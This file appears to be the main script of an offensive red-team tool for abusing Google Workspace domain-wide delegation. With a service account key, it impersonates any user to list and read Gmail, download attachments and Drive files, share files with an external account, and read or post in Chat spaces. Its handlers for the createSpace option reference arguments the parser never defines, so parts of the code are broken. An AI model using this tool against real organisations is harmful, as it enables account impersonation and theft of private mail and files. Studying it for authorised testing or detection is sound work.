#!/usr/bin/env python3
"""
GCP Domain Wide Delegation Abuse Tool
Author: Lutzenfried
"""

import argparse
import sys
# Make sure all functions are imported, including the new one
from modules.gmailDumper import *
from modules.driveDumper import *
from modules.chatInteract import *

def print_banner():
    version = "3.1.0" # Version updated for the new feature

    banner = """
██████╗ ███████╗██╗     ███████╗ ██████╗  █████╗ ████████╗███████╗
██╔══██╗██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
██║  ██║█████╗  ██║     █████╗  ██║  ███╗███████║   ██║   █████╗  
██║  ██║██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██║   ██║   ██╔══╝    
██████╔╝███████╗███████╗███████╗╚██████╔╝██║  ██║   ██║   ███████╗  v%s
╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  by @lutzenfried
""" % version
    print(banner)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='GCP Domain Wide Delegation Abuse Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-k', '--key', required=True, help='Service Account Key JSON file path')
    parser.add_argument('-i', '--impersonate', required=True, help='Email address to impersonate')
    parser.add_argument('-m', '--module', required=True, 
                       choices=['gmail', 'drive', 'chat'],
                       help='Module to use')
    parser.add_argument('-a', '--action', required=True, help='Action to perform')
    
    parser.add_argument('--space-id', help='Space ID for chat operations')
    parser.add_argument('--thread-id', help='Thread ID for chat operations')
    parser.add_argument('--filename', help='Filename for file operations')
    parser.add_argument('--filepath', help='File path for upload operations')
    parser.add_argument('--foldername', help='Folder name for drive operations')
    parser.add_argument('--label', help='Gmail label name')
    parser.add_argument('--recipient', help='Email recipient')
    parser.add_argument('--subject', help='Email subject')
    parser.add_argument('--content', help='Email/message content')
    parser.add_argument('--text', help='Message text for chat')
    parser.add_argument('--attendees', help='Comma-separated list of attendee emails')
    parser.add_argument('--external-account', help='External account for permissions')
    parser.add_argument('--max-results', type=int, default=100, help='Maximum results to return')
    parser.add_argument('--threaded', action='store_true', help='Create threaded chat space')
    
    args = parser.parse_args()
    
    print(f"[*] Authentication: Using Service Account Key")
    print(f"[*] Impersonating: {args.impersonate}")
    print(f"[*] Module: {args.module}")
    print(f"[*] Action: {args.action}\n")
    
    # Gmail Module
    if args.module == 'gmail':
        if args.action == 'list':
            listEmails(args.key, args.impersonate)
        elif args.action == 'read':
            readEmails(args.key, args.impersonate)
        elif args.action == 'listFolders':
            listFolders(args.key, args.impersonate)
        elif args.action == 'listFromLabel':
            if not args.label:
                print("[!] --label required for this action")
                sys.exit(1)
            listEmailFromLabel(args.key, args.impersonate, args.label)
        elif args.action == 'readFromLabel':
            if not args.label:
                print("[!] --label required for this action")
                sys.exit(1)
            readFromLabel(args.key, args.impersonate, args.label)
        elif args.action == 'send':
            if not all([args.recipient, args.subject, args.content]):
                print("[!] --recipient, --subject, and --content required")
                sys.exit(1)
            sendEmail(args.key, args.impersonate, args.recipient, args.subject, args.content)
        elif args.action == 'downloadAttachments':
            downloadAttachments(args.key, args.impersonate)
        else:
            print(f"[!] Unknown action for gmail: {args.action}")
    
    # Module Drive
    elif args.module == 'drive':
        if args.action == 'listFiles':
            listFiles(args.key, args.impersonate)
        elif args.action == 'listFolders':
            listFolders(args.key, args.impersonate)
        elif args.action == 'download':
            if not args.filename:
                print("[!] L'argument --filename est requis pour cette action.")
                sys.exit(1)
            # APPEL DE FONCTION MIS À JOUR pour inclure le nom du dossier optionnel
            downloadFiles(args.key, args.impersonate, args.filename, args.foldername)
        elif args.action == 'upload':
            if not all([args.filepath, args.filename]):
                print("[!] Les arguments --filepath et --filename sont requis.")
                sys.exit(1)
            uploadFiles(args.key, args.impersonate, args.filepath, args.filename, args.foldername)
        elif args.action == 'modifyPermissions':
            if not all([args.external_account, args.filename]):
                print("[!] Les arguments --external-account et --filename sont requis.")
                sys.exit(1)
            modifyPermissions(args.key, args.impersonate, args.external_account, args.filename)
        else:
            print(f"[!] Action inconnue pour le module drive : {args.action}")
    
    # Chat Module
    elif args.module == 'chat':
        if args.action == 'listSpaces':
            listSpaces(args.key, args.impersonate)
        elif args.action == 'listMessages':
            if not args.space_id:
                print("[!] --space-id required for this action")
                sys.exit(1)
            listSpaceMessages(args.key, args.impersonate, args.space_id, args.max_results)
        elif args.action == 'readMessages':
            if not args.space_id:
                print("[!] --space-id required for this action")
                sys.exit(1)
            readMessages(args.key, args.impersonate, args.space_id, args.max_results)
        elif args.action == 'sendMessage':
            if not all([args.space_id, args.text]):
                print("[!] --space-id and --text required")
                sys.exit(1)
            sendMessage(args.key, args.impersonate, args.space_id, args.text, args.thread_id)
        elif args.action == 'sendWithAttachment':
            if not all([args.space_id, args.text, args.filepath]):
                print("[!] --space-id, --text, and --filepath required")
                sys.exit(1)
            sendMessageWithAttachment(args.key, args.impersonate, args.space_id, 
                                    args.text, args.filepath, args.thread_id)
        elif args.action == 'downloadAttachments':
            if not args.space_id:
                print("[!] --space-id required for this action")
                sys.exit(1)
            downloadAttachments(args.key, args.impersonate, args.space_id, args.max_results)
        elif args.action == 'getMembers':
            if not args.space_id:
                print("[!] --space-id required for this action")
                sys.exit(1)
            getSpaceMembers(args.key, args.impersonate, args.space_id)
        elif args.action == 'createSpace':
            if not args.summary:
                print("[!] --summary required for space name")
                sys.exit(1)
            createSpace(args.key, args.impersonate, args.summary, 
                       args.description or '', args.threaded)
        else:
            print(f"[!] Unknown action for chat: {args.action}")
    
    print("\n[*] Operation completed.")

if __name__ == '__main__':
    main()